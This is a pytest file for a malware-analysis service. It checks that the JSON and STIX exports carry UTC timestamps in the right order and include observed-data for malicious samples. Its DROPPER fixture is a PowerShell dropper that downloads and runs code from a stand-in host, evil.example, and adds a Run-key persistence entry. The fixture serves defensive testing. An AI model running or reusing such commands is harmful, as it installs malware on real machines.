"""An evidence document that cannot say WHEN is not evidence.

`export.json` — the SPA's "JSON" button, documented as "Full analysis as JSON" —
had 32 keys and not one of them was a time except `generated_at`, the instant
the button was pressed. Nothing said when the sample arrived, when the analysis
started, or how long it took. Every incident timeline, every "what did you know
and when", and every correlation against another system's logs needs those.

`export.stix` was worse in a more specific way: the ObservedData object, which
carries the only timestamp in a STIX bundle, sat in an `elif` reached only when
the sample was NOT malicious. So the one export a SOC ingests, describing the one
sample they care about most, had no time in it at all.

And the same instant appeared in four forms across the product's outputs: naive
`2026-07-28T13:27:03.382547` here, `+00:00` in the incident export, `Z` in the
signed one, epoch-milliseconds in CEF. Anything reading two of them had to know
which was which. This file pins the JSON export to UTC with an explicit offset.
"""
from __future__ import annotations

import json
from datetime import datetime

from tests.test_api import _poll_until_done, _submit

DROPPER = (
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b" -Name Upd -Value 'p.exe'\n"
)
CLEAN = b"# a note\nnothing here\n"


def _export(client, auth, payload, name, what):
    public_id = _submit(client, auth, name, payload)
    _poll_until_done(client, auth, public_id)
    response = client.get(f"/api/jobs/{public_id}/{what}", headers=auth)
    assert response.status_code == 200, response.text
    return public_id, response


def test_the_json_export_says_when(client, auth) -> None:
    _pid, response = _export(client, auth, DROPPER, "dropper.ps1", "export.json")
    body = response.json()
    for field in ("submitted_at", "completed_at", "generated_at"):
        assert body.get(field), f"export.json has no {field}"
    assert "duration_ms" in body


def test_every_timestamp_carries_an_offset(client, auth) -> None:
    """Naive UTC and local time are the same string. A reader cannot tell."""
    _pid, response = _export(client, auth, DROPPER, "dropper.ps1", "export.json")
    body = response.json()
    for field in ("submitted_at", "started_at", "completed_at", "generated_at"):
        value = body.get(field)
        if value is None:
            continue
        parsed = datetime.fromisoformat(value)
        assert parsed.tzinfo is not None, f"{field}={value!r} has no offset"
        assert parsed.utcoffset().total_seconds() == 0, f"{field} is not UTC: {value}"


def test_the_times_are_in_the_right_order(client, auth) -> None:
    _pid, response = _export(client, auth, DROPPER, "dropper.ps1", "export.json")
    body = response.json()
    submitted = datetime.fromisoformat(body["submitted_at"])
    completed = datetime.fromisoformat(body["completed_at"])
    assert submitted <= completed
    assert datetime.fromisoformat(body["generated_at"]) >= completed
    if body.get("duration_ms") is not None:
        assert body["duration_ms"] >= 0


def _observed(bundle: dict) -> list[dict]:
    return [o for o in bundle.get("objects", []) if o.get("type") == "observed-data"]


def test_a_malicious_stix_bundle_has_an_observed_time(client, auth) -> None:
    """The regression in one sentence: the timestamp lived in the else branch."""
    _pid, response = _export(client, auth, DROPPER, "dropper.ps1", "export.stix")
    bundle = json.loads(response.content)
    kinds = {o.get("type") for o in bundle["objects"]}
    assert "indicator" in kinds, f"this sample was not treated as malicious: {kinds}"
    observed = _observed(bundle)
    assert observed, f"a malicious bundle with no observed-data: {sorted(kinds)}"
    assert observed[0]["first_observed"], observed[0]
    assert observed[0]["object_refs"], observed[0]


def test_a_clean_stix_bundle_still_has_one(client, auth) -> None:
    """The branch that always worked, so the fix cannot have traded one for the
    other."""
    _pid, response = _export(client, auth, CLEAN, "note.txt", "export.stix")
    bundle = json.loads(response.content)
    observed = _observed(bundle)
    assert observed, sorted({o.get("type") for o in bundle["objects"]})
    assert observed[0]["first_observed"]


def test_a_clean_bundle_makes_no_accusation(client, auth) -> None:
    _pid, response = _export(client, auth, CLEAN, "note.txt", "export.stix")
    bundle = json.loads(response.content)
    assert "indicator" not in {o.get("type") for o in bundle["objects"]}
